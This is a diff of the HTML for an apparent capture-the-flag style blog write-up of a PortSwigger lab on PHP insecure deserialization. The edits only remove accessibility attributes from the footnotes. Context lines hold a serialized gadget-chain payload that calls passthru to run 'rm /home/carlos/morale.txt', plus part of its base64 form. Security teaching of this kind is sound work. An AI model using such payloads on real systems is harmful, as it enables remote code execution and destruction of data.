@@ -107,7 +107,7 @@
   <source srcset="/blog/assets/2023/supply-chain2.webp" type="image/webp" />
   <img src="/blog/assets/2023/supply-chain2.png" width="256" height="256" alt="" loading="eager" fetchpriority="high" />
 </picture>
-<p><sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>
+<p><sup id="fnref:1"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>
 <br /></p>
 
 <h2 id="lab-link">Lab Link</h2>
@@ -215,7 +215,7 @@ You can sometimes read source code by appending a tilde (~) to a filename to ret
 </picture>
 <p><br /></p>
 
-<p>So we can check if this website is vulnerable to insecure deserialization<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>.</p>
+<p>So we can check if this website is vulnerable to insecure deserialization<sup id="fnref:2"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>.</p>
 
 <p>For creating a custom gadget chain, we check the code we got above for kick-off(The first gadget in the chain that triggers the whole gadget chain) and sink gadgets(The last gadget in the chain that can execute our arbitrary code).</p>
 
@@ -317,7 +317,7 @@ TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2Nf
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"CustomTemplate"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">"default_desc_type"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"desc"</span><span class="p">;</span><span class="nc">O</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"DefaultMap"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"callback"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"passthru"</span><span class="p">;}}</span>
 </code></pre></div></div>
 
-<p>If we don’t want to edit the output and directly copy-paste the payload, as mentioned above we have to treat serialized php objects as binary format, as the <code class="language-plaintext highlighter-rouge">serialize</code> function help explains<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>:</p>
+<p>If we don’t want to edit the output and directly copy-paste the payload, as mentioned above we have to treat serialized php objects as binary format, as the <code class="language-plaintext highlighter-rouge">serialize</code> function help explains<sup id="fnref:3"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Note that this is a binary string which may include null bytes, and needs to be stored and handled as such.
 For example, **serialize()** output should generally be stored in a BLOB field in a database, 
@@ -385,16 +385,16 @@ rather than a CHAR or TEXT field.
 <h2 id="references"><em>References</em></h2>
 <hr />
 
-<div class="footnotes" role="doc-endnotes">
+<div class="footnotes">
   <ol>
-    <li id="fn:1" role="doc-endnote">
-      <p>Icon made by <a href="https://www.flaticon.com/authors/paul-j">Paul J.</a> from <a href="https://www.flaticon.com/">www.flaticon.com</a> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    <li id="fn:1">
+      <p>Icon made by <a href="https://www.flaticon.com/authors/paul-j">Paul J.</a> from <a href="https://www.flaticon.com/">www.flaticon.com</a> <a href="#fnref:1" class="reversefootnote">&#8617;</a></p>
     </li>
-    <li id="fn:2" role="doc-endnote">
-      <p><a href="https://portswigger.net/web-security/deserialization">Insecure deserialization | Web Security Academy</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    <li id="fn:2">
+      <p><a href="https://portswigger.net/web-security/deserialization">Insecure deserialization | Web Security Academy</a> <a href="#fnref:2" class="reversefootnote">&#8617;</a></p>
     </li>
-    <li id="fn:3" role="doc-endnote">
-      <p><a href="https://www.php.net/manual/en/function.serialize.php">PHP:serialize - Manual</a> <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    <li id="fn:3">
+      <p><a href="https://www.php.net/manual/en/function.serialize.php">PHP:serialize - Manual</a> <a href="#fnref:3" class="reversefootnote">&#8617;</a></p>
     </li>
   </ol>
 </div>
